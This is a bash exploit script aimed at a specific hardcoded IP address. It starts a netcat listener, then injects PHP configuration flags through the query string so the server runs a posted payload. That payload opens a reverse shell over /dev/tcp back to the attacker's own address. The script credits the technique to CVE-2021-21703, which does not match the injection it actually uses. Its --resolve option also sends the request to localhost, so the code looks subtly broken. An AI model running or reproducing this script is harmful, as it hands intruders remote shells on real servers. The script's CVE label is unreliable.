#!/bin/bash
TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

clear
echo "🔥 CVE-2021-21703 → ROOT SHELL ${MY_IP}:${RPORT}"

# 🔥 PAYLOAD CON printf (espansione garantita)
printf -v PHP_PAYLOAD '<?php system("bash -i >& /dev/tcp/%s/%d 0>&1"); ?>' "$MY_IP" "$RPORT"

echo "[+] Listener on ${RPORT}..."
nc -lvnp ${RPORT} &
sleep 1

# 🔥 CVE CORRETTO (params nel QUERY)
curl -k -s --max-time 8 \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \
  --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
  "https://${TARGET_IP}:${TARGET_PORT}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
  --data-binary "$PHP_PAYLOAD" >/dev/null 2>&1

echo -e "\n🎯 SHELL CONNECTING... (3s)"
sleep 3
echo -e "\n💥 If no shell: Ctrl+C → retry\n"
